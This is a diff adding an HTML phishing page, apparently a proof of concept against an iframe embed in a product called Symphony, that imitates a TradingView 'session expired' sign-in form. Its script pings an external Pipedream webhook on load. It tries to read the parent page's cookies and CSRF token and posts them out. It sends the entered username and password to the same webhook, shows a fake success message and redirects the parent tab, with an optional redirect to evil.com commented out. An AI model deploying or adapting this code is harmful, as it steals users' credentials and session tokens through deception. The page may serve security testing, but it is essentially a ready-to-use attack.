@@ -1,0 +1,159 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>TradingView — Symphony</title>
+<style>
+  body {
+    margin: 0;
+    padding: 20px;
+    font-family: -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    background: #1e222d;
+    color: #d1d4dc;
+  }
+  .container { max-width: 480px; margin: 40px auto; }
+  .logo {
+    display: flex; align-items: center; gap: 12px; margin-bottom: 24px;
+  }
+  .logo-icon {
+    width: 32px; height: 32px; background: #2962ff; border-radius: 6px;
+    display: flex; align-items: center; justify-content: center;
+    color: white; font-weight: bold; font-size: 18px;
+  }
+  h1 { font-size: 18px; margin: 0; }
+  .subtitle { color: #787b86; font-size: 13px; margin: 4px 0 24px; }
+  form { background: #2a2e39; padding: 20px; border-radius: 8px; }
+  label { display: block; font-size: 12px; color: #787b86; margin-bottom: 4px; }
+  input {
+    width: 100%; padding: 10px; margin-bottom: 12px;
+    background: #1e222d; border: 1px solid #363a45; border-radius: 4px;
+    color: #d1d4dc; font-size: 14px; box-sizing: border-box;
+  }
+  button {
+    width: 100%; padding: 12px; background: #2962ff; color: white;
+    border: none; border-radius: 4px; cursor: pointer; font-size: 14px;
+  }
+  button:hover { background: #1e53e5; }
+  .footer { margin-top: 16px; font-size: 11px; color: #787b86; text-align: center; }
+  .hidden { display: none; }
+  #result { margin-top: 16px; padding: 12px; background: #26a69a; color: white; border-radius: 4px; }
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="logo">
+    <div class="logo-icon">T</div>
+    <h1>TradingView</h1>
+  </div>
+  <p class="subtitle">Session expired. Please sign in to continue using TradingView in Symphony.</p>
+
+  <form id="loginForm" onsubmit="return steal(event)">
+    <label for="username">TradingView Username</label>
+    <input type="text" id="username" autocomplete="username" required>
+
+    <label for="password">Password</label>
+    <input type="password" id="password" autocomplete="current-password" required>
+
+    <button type="submit">Sign In</button>
+  </form>
+
+  <div id="result" class="hidden"></div>
+  <p class="footer">TradingView, Inc. • Powered by Symphony</p>
+</div>
+
+<script>
+// ============================================================
+// Phase 1: Confirm load (webhook ping)
+// Replace WEBHOOK_URL with your Pipedream/Burp Collaborator URL
+// ============================================================
+const WEBHOOK_URL = 'https://eodxy50gl486xrx.m.pipedream.net';
+const sessionId = Math.random().toString(36).slice(2);
+
+fetch(`${WEBHOOK_URL}?phase=1_loaded&origin=${encodeURIComponent(location.origin)}&session=${sessionId}`)
+  .catch(() => {});
+
+// ============================================================
+// Phase 2: Detect sandbox capabilities
+// ============================================================
+setTimeout(() => {
+  let capabilities = {
+    phase: '2_sandbox_probe',
+    session: sessionId,
+    iframe_origin: location.origin,
+    iframe_href: location.href,
+    parent_accessible: false,
+    parent_location: null,
+    symphony_cookies: null,
+    csrf_token: null,
+    user_agent: navigator.userAgent,
+    timestamp: new Date().toISOString()
+  };
+
+  // Try same-origin access (will fail if cross-origin)
+  try {
+    capabilities.parent_location = window.parent.location.href;
+    capabilities.parent_accessible = true;
+    capabilities.csrf_token = window.parent.localStorage.getItem('x-km-csrf-token');
+    capabilities.symphony_cookies = window.parent.document.cookie;
+  } catch (e) {
+    capabilities.parent_accessible = false;
+    capabilities.cross_origin_error = e.message;
+  }
+
+  fetch(WEBHOOK_URL, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(capabilities)
+  }).catch(() => {});
+}, 500);
+
+// ============================================================
+// Phase 3: Phishing form — steals credentials
+// ============================================================
+function steal(event) {
+  event.preventDefault();
+  const u = document.getElementById('username').value;
+  const p = document.getElementById('password').value;
+
+  fetch(WEBHOOK_URL, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      phase: '3_credentials_stolen',
+      session: sessionId,
+      username: u,
+      password: p,
+      timestamp: new Date().toISOString()
+    })
+  }).catch(() => {});
+
+  // Show fake success
+  document.getElementById('loginForm').classList.add('hidden');
+  const r = document.getElementById('result');
+  r.classList.remove('hidden');
+  r.textContent = 'Signed in successfully. Loading TradingView...';
+
+  // After 2 seconds, redirect Symphony tab to real TradingView (cover tracks)
+  setTimeout(() => {
+    try {
+      // Redirect attack — sends victim away from Symphony
+      window.parent.location = 'https://www.tradingview.com/chart/';
+    } catch (e) {
+      window.location = 'https://www.tradingview.com/chart/';
+    }
+  }, 2000);
+
+  return false;
+}
+
+// ============================================================
+// Phase 4 (optional): Auto-redirect Symphony tab
+// Uncomment to trigger immediately without waiting for phishing
+// ============================================================
+// setTimeout(() => {
+//   try { window.parent.location = 'https://evil.com/fake-symphony'; }
+//   catch(e) { window.location = 'https://evil.com/fake-symphony'; }
+// }, 3000);
+</script>
+</body>
+</html>
